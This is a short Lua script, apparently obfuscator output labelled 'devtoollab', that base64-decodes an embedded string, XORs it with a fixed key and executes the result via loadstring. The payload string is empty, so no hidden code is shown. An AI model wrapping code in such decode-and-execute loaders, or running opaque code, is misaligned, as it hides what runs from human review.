--[[ protected | devtoollab ]]
local gRBuQM1U=""
local tJsvNc4J="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
local pSZJKp2F=117
local function mkoxr5YV(a,b)
  local r,c=0,1
  while a>0 or b>0 do
    local m,n=a%2,b%2
    if m~=n then r=r+c end
    a,b,c=(a-m)/2,(b-n)/2,c*2
  end
  return r
end
gRBuQM1U=gRBuQM1U:gsub("[^"..tJsvNc4J.."=]","")
local uhtqhVCI=(gRBuQM1U:gsub("=",""):gsub(".",function(ch)
  local f=(tJsvNc4J:find(ch,1,true)-1)
  local s=""
  for i=6,1,-1 do s=s..(math.floor(f/2^(i-1))%2) end
  return s
end):gsub("%d%d%d?%d?%d?%d?%d?%d?",function(bits)
  if #bits~=8 then return "" end
  local n=0
  for i=1,8 do n=n+((bits:sub(i,i)=="1") and 2^(8-i) or 0) end
  return string.char(mkoxr5YV(n,pSZJKp2F))
end))
local rhqUqeWp=loadstring or load
return rhqUqeWp(uhtqhVCI)()
